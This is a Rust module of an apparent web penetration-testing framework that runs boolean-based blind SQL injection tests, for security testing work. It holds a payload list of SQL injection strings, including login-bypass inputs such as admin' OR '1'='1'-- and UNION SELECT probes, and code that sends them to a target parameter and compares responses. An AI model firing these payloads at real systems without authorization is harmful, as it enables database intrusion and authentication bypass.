use anyhow::Result;
use async_trait::async_trait;
use chrono::Utc;

use crate::web::{WebModule, ModuleInfo, ModuleContext, ExecutionResult};
use crate::web::injection::{InjectionConfig, InjectionEngine};

pub struct BooleanSQLiModule;

impl BooleanSQLiModule {
    pub fn new() -> Self {
        Self
    }
    
    fn get_payloads(&self) -> Vec<String> {
        vec![
            // Basic boolean tests
            "' OR '1'='1".to_string(),
            "' OR 1=1--".to_string(),
            "' OR 1=1#".to_string(),
            "' OR 1=1/*".to_string(),
            "admin' OR '1'='1".to_string(),
            "admin' OR '1'='1'--".to_string(),
            "admin' OR '1'='1'#".to_string(),
            "admin' OR '1'='1'/*".to_string(),
            
            // True condition
            "' OR 'a'='a".to_string(),
            "' OR 'test'='test'--".to_string(),
            "1' AND '1'='1".to_string(),
            "1' AND 1=1--".to_string(),
            
            // False condition (for comparison)
            "' OR '1'='2".to_string(),
            "' OR 1=2--".to_string(),
            "1' AND '1'='2".to_string(),
            "1' AND 1=2--".to_string(),
            
            // MySQL boolean
            "' OR SLEEP(0)='0".to_string(),
            "1' AND EXISTS(SELECT 1)--".to_string(),
            
            // PostgreSQL boolean
            "' OR TRUE--".to_string(),
            "' AND TRUE--".to_string(),
            "1' OR TRUE--".to_string(),
            
            // MSSQL boolean
            "' OR 1=1;--".to_string(),
            "admin' OR 1=1;--".to_string(),
            
            // Union-based boolean
            "' UNION SELECT NULL--".to_string(),
            "' UNION SELECT NULL,NULL--".to_string(),
            "' UNION SELECT NULL,NULL,NULL--".to_string(),
            
            // Subquery boolean
            "' OR (SELECT 'x')='x'--".to_string(),
            "1' AND (SELECT 1)=1--".to_string(),
            
            // Encoded versions
            "%27%20OR%20%271%27%3D%271".to_string(),
            "%27%20OR%201%3D1--%20".to_string(),
        ]
    }
}

#[async_trait]
impl WebModule for BooleanSQLiModule {
    fn info(&self) -> ModuleInfo {
        ModuleInfo {
            id: "web/sqli/boolean".to_string(),
            name: "Boolean-Based SQL Injection".to_string(),
            category: "SQLi".to_string(),
            description: "Boolean-based blind SQL injection testing. Compares true vs false conditions to detect SQL injection vulnerabilities by analyzing response differences.".to_string(),
            author: "CAP Framework".to_string(),
            references: vec![
                "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass".to_string(),
                "https://portswigger.net/web-security/sql-injection/blind".to_string(),
            ],
        }
    }
    
    fn required_options(&self) -> Vec<String> {
        vec![
            "REQUEST (file path)".to_string(),
            "INJECTION_POINT (parameter name)".to_string(),
        ]
    }
    
    async fn execute(&self, context: &ModuleContext) -> Result<ExecutionResult> {
        let request = context.request.as_ref()
            .ok_or_else(|| anyhow::anyhow!("No request loaded"))?;
        
        let injection_point = context.injection_point.as_ref()
            .ok_or_else(|| anyhow::anyhow!("No injection point set"))?;
        
        let payloads = self.get_payloads();
        
        let config = InjectionConfig {
            dry_run: context.get_option("DRY_RUN").map(|s| s == "true").unwrap_or(false),
            confirm_each: context.get_option("CONFIRM_EACH").map(|s| s == "true").unwrap_or(false),
            timeout_secs: 10,
            follow_redirects: false,
        };
        
        let engine = InjectionEngine::new(config)?;
        
        // First, get baseline response
        let baseline_payload = context.get_option("BASELINE").cloned()
            .unwrap_or_else(|| "BASELINE_VALUE".to_string());
        
        let baseline = engine.inject_single(request, injection_point, &baseline_payload).await?;
        
        // Now test all payloads
        let mut results = vec![baseline.clone()];
        let test_results = engine.inject_batch(request, injection_point, &payloads).await?;
        results.extend(test_results);
        
        let mut findings = Vec::new();
        
        // Analyze for boolean differences
        let baseline_len = baseline.response_length;
        let baseline_status = baseline.status_code;
        
        for result in &results[1..] {
            // Check if response differs significantly from baseline
            let len_diff = if result.response_length > baseline_len {
                result.response_length - baseline_len
            } else {
                baseline_len - result.response_length
            };
            
            let len_diff_percent = (len_diff as f64 / baseline_len as f64) * 100.0;
            
            // Significant length difference
            if len_diff_percent > 5.0 {
                findings.push(format!("Response length changed {}% with payload: {} (baseline: {}, result: {})", 
                    len_diff_percent as i32,
                    result.payload,
                    baseline_len,
                    result.response_length
                ));
            }
            
            // Status code change
            if result.status_code != baseline_status {
                findings.push(format!("Status code changed from {} to {} with payload: {}", 
                    baseline_status,
                    result.status_code,
                    result.payload
                ));
            }
            
            // Check for SQL errors
            if result.analysis.has_error_indicators {
                let body_lower = result.response_body.to_lowercase();
                
                if body_lower.contains("sql") || body_lower.contains("mysql") || 
                   body_lower.contains("ora-") || body_lower.contains("pg_") ||
                   body_lower.contains("sqlite") {
                    findings.push(format!("SQL error detected with payload: {}", result.payload));
                }
            }
        }
        
        if findings.is_empty() {
            findings.push("No boolean-based SQL injection detected".to_string());
        }
        
        Ok(ExecutionResult {
            success: findings.len() > 1, // More than just the "not detected" message
            findings,
            injection_results: results,
            module_id: self.info().id,
            timestamp: Utc::now(),
        })
    }
}
